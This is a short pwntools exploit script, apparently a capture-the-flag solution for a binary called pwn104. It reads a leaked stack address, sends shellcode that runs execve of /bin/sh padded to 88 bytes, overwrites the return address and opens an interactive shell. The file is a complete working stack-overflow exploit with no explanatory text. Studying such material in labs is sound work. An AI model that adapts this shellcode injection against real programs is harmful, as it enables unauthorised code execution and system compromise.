from pwn import *

p = process("./pwn104.pwn104")

p.recvuntil(b"at ")
buffer = p.recvline()

adress = p64(int(buffer, 16))

shellcode = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05' #23

payload = shellcode
payload += b"A"* (88 - len(shellcode))
payload += adress

p.sendline(payload)
p.interactive()